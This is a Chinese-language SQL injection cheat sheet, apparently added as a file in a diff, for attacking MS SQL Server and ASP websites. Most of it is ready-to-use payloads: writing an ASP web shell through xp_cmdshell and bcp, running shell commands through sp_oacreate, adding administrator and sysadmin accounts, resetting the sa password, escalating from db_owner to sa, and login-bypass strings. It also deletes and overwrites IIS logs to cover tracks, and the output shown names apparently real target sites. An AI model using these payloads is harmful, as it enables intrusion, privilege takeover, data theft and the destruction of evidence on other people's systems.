@@ -1,0 +1,262 @@
+1、 我在检测索尼中国的网站漏洞时，分明已经确定了漏洞存在却无法在这三种漏洞中找到对应的类型。偶然间我想到了在SQL语言中可以使用"in"关键字进行查询，例如"select * from mytable where id in(1)"，括号中的值就是我们提交的数据，它的结果与使用"select * from mytable where id=1"的查询结果完全相同。所以访问页面的时候在URL后面加上") and 1=1 and 1 in(1"后原来的SQL语句就变成了"select * from mytable where id in(1) and 1=1 and 1 in(1)"，这样就会出现期待已久的页面了。暂且就叫这种类型的漏洞为"包含数字型"吧，聪明的你一定想到了还有"包含字符型"呢。对了，它就是由于类似"select * from mytable where name in('firstsee')"的查询语句造成的。
+ 
+2、 http://192.168.1.5/display.asp?keyno=1881;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:\mu.asp';-- 
+用^转义字符来写ASP文件的方法。
+
+3、 http://192.168.1.5/display.asp?keyno=188 and 1=(select @@VERSION) 
+显示SQL系统版本：
+Microsoft VBScript 编译器错误 错误 '800a03f6' 
+缺少 'End' 
+/iisHelp/common/500-100.asp，行242 
+Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988-2003 Microsoft Corporation Desktop Engine on Windows NT 5.0 (Build 2195: Service Pack 4) ' to a column of data type int. 
+/display.asp，行17
+
+
+4、 http://192.168.1.5/display.asp?keyno=188 and 1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')
+判断xp_cmdshell扩展存储过程是否存在。
+
+5、 http://192.168.1.5/display.asp?keyno=188;EXEC%20master.dbo.xp_regwrite%20'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','help1','REG_SZ','cmd.exe%20/c%20net user test ptlove /add'
+向启动组中写入命令行和执行程序
+
+6、 http://192.168.1.5/display.asp?keyno=188%20and%200<;>db_name()
+查看当前的数据库名称Microsoft VBScript 编译器错误 错误 '800a03f6' 
+缺少 'End' 
+/iisHelp/common/500-100.asp，行242 
+Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'huidahouse' to a column of data type int. 
+/display.asp，行17 
+7、 列出当前所有的数据库名称：select * from master.dbo.sysdatabases
+
+8、 不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令：
+create TABLE mytmp(info VARCHAR(400),ID int IDENTITY(1,1) NOT NULL)
+DECLARE @shell INT
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @isEnd BIT
+DECLARE @out VARCHAR(400)
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c dir c:\>c:\temp.txt','0','true'
+--注意run的参数true指的是将等待程序运行的结果，对于类似ping的长时间命令必需使用此参数。
+
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output
+EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt'
+--因为fso的opentextfile方法将返回一个textstream对象，所以此时@file是一个对象令牌
+
+WHILE @shell>0
+BEGIN
+EXEC sp_oamethod @file,'Readline',@out out
+insert INTO MYTMP(info) VALUES (@out)
+EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out
+IF @isEnd=1 BREAK
+ELSE CONTINUE
+END
+
+drop TABLE MYTMP 
+
+----------
+DECLARE @shell INT
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @isEnd BIT
+DECLARE @out VARCHAR(400)
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll">c:\temp.txt','0','true'
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output
+EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt'
+WHILE @shell>0
+BEGIN
+EXEC sp_oamethod @file,'Readline',@out out
+insert INTO MYTMP(info) VALUES (@out)
+EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out
+IF @isEnd=1 BREAK
+ELSE CONTINUE
+END
+
+以下是一行里面将WEB用户加到管理员组中：
+DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll">c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+以下是一行中执行EXE程序：
+DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript.exe E:\bjeea.net.cn\score\fts\images\iis.vbs lh1 c:\>c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+SQL下两种执行CMD命令的方法：
+
+先删除7.18号日志：
+(1)exec master.dbo.xp_cmdshell 'del C:\winnt\system32\logfiles\W3SVC5\ex050718.log >c:\temp.txt'
+(2)DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c del C:\winnt\system32\logfiles\W3SVC5\ex050718.log >c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+再考贝一个其它文件来代替7.18日文件：
+(1)exec master.dbo.xp_cmdshell 'copy C:\winnt\system32\logfiles\W3SVC5\ex050716.log C:\winnt\system32\logfiles\W3SVC5\ex050718.log>c:\temp.txt'
+(2)DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c copy C:\winnt\system32\logfiles\W3SVC5\ex050716.log C:\winnt\system32\logfiles\W3SVC5\ex050718.log>c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+9、 用update来更新表中的数据：
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;update upload.dbo.admin set pwd=' a0b923820dcc509a' where username='www';--
+www用户密码的MD5值为：AAABBBCCCDDDEEEF，即把密码改成1；
+
+10、 利用表内容导成文件功能
+SQL有BCP命令，它可以把表的内容导成文本文件并放到指定位置。利用这项功能，我们可以先建一张临时表，然后在表中一行一行地输入一个ASP木马，然后用BCP命令导出形成ASP文件。
+命令行格式如下：
+bcp "select * from temp " queryout c:\inetpub\wwwroot\runcommand.asp –c –S localhost –U sa –P upload('S'参数为执行查询的服务器，'U'参数为用户名，'P'参数为密码，最终上传了一个runcommand.asp的木马)。
+
+10、创建表、播入数据和读取数据的方法
+? 创建表：
+' and 1=1 union select 1,2,3,4;create table [dbo].[cyfd]([gyfd][char](255))--
+? 往表里播入数据：
+' and 1=1 union select 1,2,3,4;DECLARE @result varchar(255) select top 1 name from upload.dbo.sysobjects where xtype='U' and status>0,@result output insert into cyfd (gyfd) values(@result);--
+' and 1=1 union select 1,2,3,4;DECLARE @result varchar(255) exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CONTROLSet001\Services\W3SVC\Parameters\Virtual Roots', '/' ,@result output insert into cyfd (gyfd) values(@result);--
+? 从表里读取数据：
+' and 1=(select count(*) from cyfd where gyfd >1)--
+
+? 删除临时表：
+';drop table cyfd;--
+
+12、通过SQL语句直接更改sa的密码：
+? update master.dbo.sysxlogins set password=0x0100AB01431E944AA50CBB30267F53B9451B7189CA67AF19A1FC944AA50CBB30267F53B9451B7189CA67AF19A1FC where sid=0x01,这样sa的密码就被我们改成了111111拉。呵呵，解决的方法就是把sa给删拉。，怎么删可以参考我的《完全删除sa这个后门》。
+
+? 查看本机所有的数据库用户名：
+select * from master.dbo.sysxlogins
+select name,sid,password ,dbid from master.dbo.sysxlogins
+
+? 更改sa口令方法：用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'新密码','sa'
+
+13、查询dvbbs库中所有的表名和表结构
+? select * from dvbbs.dbo.sysobjects where xtype='U' and status>0
+? select * from dvbbs.dbo.syscolumns where id=1426104121
+
+14、手工备份当前数据库
+完全备份：
+;declare @a sysname,@s nvarchar(4000) 
+select @a=db_name(),@s='c:/db1' backup database @a to disk=@s WITH formAT--
+差异备份：
+;declare @a sysname,@s nvarchar(4000) 
+select @a=db_name(),@s='c:/db1' backup database @a to disk=@s WITH DIFFERENTIAL,formAT—
+
+15、添加和删除一个SA权限的用户test
+exec master.dbo.sp_addlogin test,ptlove
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+cmd.exe /c isql -E /U alma /P /i K:\test.qry 
+
+16、select * from ChouYFD.dbo.sysobjects where xtype='U' and status>0 
+就可以列出库ChouYFD中所有的用户建立的表名。
+select name,id from ChouYFD.dbo.sysobjects where xtype='U' and status>0
+
+17、
+? http://www.test.cn/zgrdw/common/image_view.jsp?sqlstr=select%20*%20from%20rdweb.dbo.syscolumns （where id=1234）
+列出rdweb库中所有表中的字段名称
+? select * from dvbbs.dbo.syscolumns where id=5575058 
+列出库dvbbs中表id=5575058的所有字段名
+
+18、删除记录命令：delete from Dv_topic where boardid=5 and topicid=7978 
+
+19、绕过登录验证进入后台的方法整理：
+1)' or''='
+2) ' or 1=1--
+3) ' or 'a'='a--
+4) 'or'='or'
+5) " or 1=1-- 
+6）or 1=1--
+7） or 'a='a
+8）" or "a"="a
+9） ') or ('a'='a
+10） ") or ("a"="a
+11） ） or (1=1
+
+20、查看WEB网站安装目录命令：
+? cscript c:\inetpub\adminscripts\adsutil.vbs enum w3svc/2/root >c:\test1.txt 
+type c:\test1.txt
+del c:\test1.txt
+在NBSI下可以直接显示运行结果，所以不用导出到文件
+
+
+另类爆网站目录：
+
+
+针对win2000系统：xp_regread读取HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots 获取WEB路径
+　　2003系统：xp_regread读取：master.dbo.xp_regread 'HKEY_USERS','S-1-5-21-4218646983-378817662-3975096876-500\Software\ Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\asp','f' （改为a,b,c...进行测试）
+　　master.dbo.xp_regread 'HKEY_USERS','S-1-5-21-3918967832-637372728-3805152807-500\Software\ Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\aspx','e'
+　　如：
+　　（1） 新建一个表cyfd(字段为gyfd)：http://www.xx.com/NewsShow.aspx?id=4844;create table [dbo].[cyfd]([gyfd][char](255))--
+　　（2） 把web路径写进去:http://www.xx.com/NewsShow.aspx?id=4844;DECLARE @result varchar(255) exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CONTROLSet001\Services\W3SVC\Parameters\Virtual Roots', '/' ,@result output insert into cyfd (gyfd) values(@result);--
+　　（3） 还是让他不匹配，显示错误:http://www.xx.com/NewsShow.aspx?id=4844 and 1=(select count(*) from cyfd where gyfd >1)
+　　Source: .Net SqlClient Data Provider
+　　Description: 将 varchar 值 'Y:\Web\烟台人才热线后台管理系统,,201 ' 转换为数据类型为 int 的列时发生语法错误。
+　　TargeSite: Boolean Read() 哈哈哈。。路径暴露了。。
+　　（4）接下来删除表:http://www.xx.com/NewsShow.aspx?id=4844;drop table cyfd;-- 
+ 
+
+
+本篇文章来源于 黑客基地-全球最大的中文黑客站 原文链接：http://www.hackbase.com/tech/2009-09-24/56385.html
+
+
+将db权限提升为sa:
+USER 
+http://www.XXXX.com/FullStory.asp?id=1 and 1=convert(int,system_user)-- 
+
+Code: 
+
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'nhaxinh' to a column of data type int. 
+/Including/general.asp, line 840 
+
+
+
+
+OPENING REMOTE LINK (http://msdn.microsoft.com/library/d..._oa-oz_78z8.asp) 
+http://www.nhaxinh.com.vn/FullStory.asp?id=1;select * from openrowset('sqloledb','';;,'')-- 
+
+Code: 
+
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+[Microsoft][ODBC SQL Server Driver][SQL Server] Ad hoc access to OLE DB provider 'sqloledb' has been denied. You must access this provider through a linked server. 
+/Including/general.asp, line 840 
+
+
+
+
+GUEST = DB_OWNER :DDD 
+http://www.XXXX.com/FullStory.asp?id=1;exec sp_executesql N'create view dbo.test as select * from master.dbo.sysusers' exec sp_msdropretry 'xx update sysusers set sid=0x01 where name=''dbo''','xx' exec sp_msdropretry 'xx update dbo.test set sid=0x01,roles=0x01 where name=''guest''','xx' exec sp_executesql N'drop view dbo.test'-- 
+
+Code: 
+
+No result expected, normal page loading 
+Enable us to do sum nice stuff like xp_regwrite e xp_cmdshell 
+
+
+
+
+ADDIN TO "BUILTIN\ADMINISTRATORS" 
+http://www.nhaxinh.com.vn/FullStory.asp?id=1;exec sp_executesql N'create view dbo.test as select * from master.dbo.sysxlogins' exec sp_msdropretry 'xx update sysusers set sid=0x01 where name=''dbo''','xx' exec sp_msdropretry 'xx update dbo.test set xstatus=18 where name=''BUILTIN\ADMINISTRATORS''','xx' exec sp_executesql N'drop view dbo.test'-- 
+
+and then 
+
+http://www.xxxx.com/FullStory.asp?id=1;exec master..sp_addsrvrolemember 'nhaxinh',sysadmin -- 
+
+ENABLE OPENROWSET/OLEDB 
+http://www.xxxx.com/FullStory.asp?id=1;select * from openrowset('sqloledb','';;,'')-- 
+
+Code: 
+
+Microsoft OLE DB Provider for ODBC Drivers error '80004005' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Login failed for user 'SYSTEM'. 
+/Including/general.asp, line 840 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
